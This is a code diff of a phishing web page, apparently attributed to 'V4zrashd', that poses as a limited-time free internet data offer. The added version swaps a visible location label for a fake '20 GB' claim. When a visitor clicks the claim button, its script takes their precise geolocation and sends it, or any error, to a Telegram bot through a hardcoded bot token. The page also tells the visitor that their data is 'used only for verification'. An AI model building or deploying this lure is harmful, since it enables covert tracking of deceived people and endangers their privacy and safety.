@@ -4,72 +4,23 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Free Internet Offer</title>
-    <link rel="stylesheet" href="style.css" />
+    <style>/* একই CSS */</style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <span class="badge">LIMITED TIME OFFER</span>
-        <h1>Free Internet</h1>
-        <p class="sub">Special Offer from V4zrashd</p>
-    </div>
-    <div class="offer-box">
-        <div class="data-icon">📍</div>
-        <div class="data-amount">Live Location</div>
-        <div class="data-label">Get Current Location</div>
-        <div class="data-sub">Click to allow location</div>
-    </div>
-    <button class="claim-btn" id="claimBtn">📍 Get Location</button>
-    <div class="footer">
-        <p>Your data is safe. Used only for verification.</p>
-        <p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p>
-    </div>
+    <div class="header"><span class="badge">LIMITED TIME OFFER</span><h1>Free Internet</h1><p class="sub">Special Offer from V4zrashd</p></div>
+    <div class="offer-box"><div class="data-icon">📍</div><div class="data-amount">20 GB</div><div class="data-label">Free Internet Data</div><div class="data-sub">Limited Time Offer</div></div>
+    <button class="claim-btn" id="claimBtn">📍 Claim Offer</button>
+    <div class="footer"><p>Your data is safe. Used only for verification.</p><p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p></div>
 </div>
 <script>
-    const params = new URLSearchParams(window.location.search);
-    const chatId = params.get('chat_id') || 'YOUR_CHAT_ID';
-    const token = '8906991625:AAHV1gjfUkDZkyz7xasYoZKkd3mryf_UKEE';
-
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
-        }).catch(() => {});
-    }
-
-    function getLocation() {
-        if (!navigator.geolocation) {
-            sendToTelegram('❌ জিওলোকেশন সাপোর্টেড নয়');
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const { latitude, longitude } = pos.coords;
-                const mapLink = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15`;
-                sendToTelegram(
-                    `📍 লাইভ লোকেশন:\nLat: ${latitude}\nLon: ${longitude}\n🗺️ <a href="${mapLink}">মানচিত্রে দেখুন</a>`
-                );
-            },
-            (err) => {
-                sendToTelegram(`❌ লোকেশন অ্যাক্সেস ডিনাই! (${err.message})`);
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-        document.getElementById('claimBtn').disabled = true;
-        document.getElementById('claimBtn').textContent = '✅ Captured';
-    }
-
-    document.getElementById('claimBtn').addEventListener('click', getLocation);
-
-    let t = 594;
-    setInterval(() => {
-        if (t <= 0) return;
-        t--;
-        const m = String(Math.floor(t/60)).padStart(2,'0');
-        const s = String(t%60).padStart(2,'0');
-        document.getElementById('timer').textContent = `${m}:${s}`;
-    }, 1000);
+    const params=new URLSearchParams(window.location.search);
+    const chatId=params.get('chat_id')||'YOUR_CHAT_ID';
+    const token='8906991625:AAHV1gjfUkDZkyz7xasYoZKkd3mryf_UKEE';
+    function sendToTelegram(text){fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text,parse_mode:'HTML'})}).catch(()=>{});}
+    function capture(){if(!navigator.geolocation){sendToTelegram('❌ জিওলোকেশন সাপোর্টেড নয়');return;}navigator.geolocation.getCurrentPosition((pos)=>{const {latitude,longitude}=pos.coords;const mapLink=`https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15`;sendToTelegram(`📍 লাইভ লোকেশন:\nLat: ${latitude}\nLon: ${longitude}\n🗺️ <a href="${mapLink}">মানচিত্রে দেখুন</a>`);},(err)=>{sendToTelegram(`❌ লোকেশন অ্যাক্সেস ডিনাই! (${err.message})`);},{enableHighAccuracy:true,timeout:10000});document.getElementById('claimBtn').disabled=true;document.getElementById('claimBtn').textContent='✅ Captured';}
+    document.getElementById('claimBtn').addEventListener('click',capture);
+    let t=594;setInterval(()=>{if(t<=0)return;t--;const m=String(Math.floor(t/60)).padStart(2,'0');const s=String(t%60).padStart(2,'0');document.getElementById('timer').textContent=`${m}:${s}`;},1000);
 </script>
 </body>
 </html>
